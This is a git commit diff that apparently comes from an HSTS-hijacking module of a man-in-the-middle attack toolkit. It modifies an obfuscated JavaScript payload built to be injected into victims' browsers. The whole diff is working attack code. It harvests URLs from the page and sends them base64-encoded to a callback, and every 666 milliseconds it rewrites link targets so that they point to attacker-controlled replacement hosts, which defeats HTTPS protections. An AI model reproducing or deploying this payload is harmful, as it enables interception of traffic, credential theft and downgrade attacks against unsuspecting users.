07a8b3f2bd7d8f8708801ebcd3c98790ab480323
yungtravla <lilprismontour@gmail.com>
2018-06-09 21:11:41 +1000

    improve core payload

--- hstshijack/payloads/hstshijack-payload.js
+++ hstshijack/payloads/hstshijack-payload.js
@@ -6,6 +6,18 @@ function obf_func_callback(obf_var_data) {
 	obf_var_req.send()
 }
 
+setInterval(function(){
+	for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
+		obf_var_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, "^[a-z][a-z0-9\\-\\.]*"), "ig")
+		document.querySelectorAll("a").forEach(function(obf_var_element) {
+			if (obf_var_element.href.match(obf_var_regexp)) {
+				obf_var_second_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, ""))
+				obf_var_element.href = obf_var_element.href.replace(obf_var_second_regexp, obf_var_replacement_hosts[obf_var_i])
+			}
+		})
+	}
+}, 666)
+
 self.addEventListener("load", function() {
 	obf_var_urls = document.body.innerHTML.match(/http(s|)\:\/\/[a-z0-9\.\-]{4,64}(:[0-9]{1,5}|)([\/][a-z0-9\-\.\/\,\_\~\!\$\&\'\(\)\*\+\;\=\:\@]*([\?][a-z0-9\%\-\.\_\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=`]*|)|[\?][a-z0-9\%\-\.\_\~\:\/\?\#\[\]\@\!\$\&\'\(\)\*\+\,\;\=`]*|)/ig)
 	for (var obf_var_i = 0; obf_var_i < obf_var_urls.length; obf_var_i++) {
@@ -13,15 +25,4 @@ self.addEventListener("load", function() {
 		obf_var_callback_log.indexOf(obf_var_host) == -1 ? obf_func_callback(btoa(obf_var_urls[obf_var_i])) : ""
 		obf_var_callback_log.push(obf_var_host)
 	}
-	setInterval(function(){
-		for (obf_var_i = 0; obf_var_i < obf_var_target_hosts.length; obf_var_i++) {
-			obf_var_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, "^[a-z][a-z0-9\\-\\.]*"), "ig")
-			document.querySelectorAll("a").forEach(function(obf_var_element) {
-				if (obf_var_element.href.match(obf_var_regexp)) {
-					obf_var_second_regexp = new RegExp(obf_var_target_hosts[obf_var_i].replace(/\./g, "\\.").replace(/\-/g, "\\-").replace(/^\*/, ""))
-					obf_var_element.href = obf_var_element.href.replace(obf_var_second_regexp, obf_var_replacement_hosts[obf_var_i])
-				}
-			})
-		}
-	}, 666)
 })
